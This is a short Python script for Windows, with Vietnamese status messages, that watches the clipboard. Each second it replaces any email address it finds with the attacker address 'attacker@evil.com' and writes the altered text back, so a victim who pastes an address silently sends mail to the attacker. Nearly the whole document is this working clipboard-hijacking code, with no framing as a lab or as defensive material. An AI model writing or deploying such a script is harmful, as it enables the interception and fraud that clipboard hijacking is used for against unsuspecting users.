import win32clipboard
import re
from time import sleep

attacker_email = "attacker@evil.com"
emailregex = r'[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}'

print("[+] Đang giám sát clipboard. Nhấn Ctrl+C để dừng.")

def get_clipboard_text():
    try:
        win32clipboard.OpenClipboard()
        if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_UNICODETEXT):
            data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT).strip()
        else:
            data = ""
        win32clipboard.CloseClipboard()
        return data
    except:
        win32clipboard.CloseClipboard()
        return ""

def set_clipboard_text(text):
    try:
        win32clipboard.OpenClipboard()
        win32clipboard.EmptyClipboard()
        win32clipboard.SetClipboardText(text, win32clipboard.CF_UNICODETEXT)
        win32clipboard.CloseClipboard()
    except:
        win32clipboard.CloseClipboard()

try:
    while True:
        data = get_clipboard_text()
        if re.search(emailregex, data, flags=re.IGNORECASE):
            replaced = re.sub(emailregex, attacker_email, data, flags=re.IGNORECASE)
            if replaced != data:
                print(f"[!] Đã thay thế email: {data} → {replaced}")
                set_clipboard_text(replaced)
        sleep(1)
except KeyboardInterrupt:
    print("\n[+] Script đã dừng.")
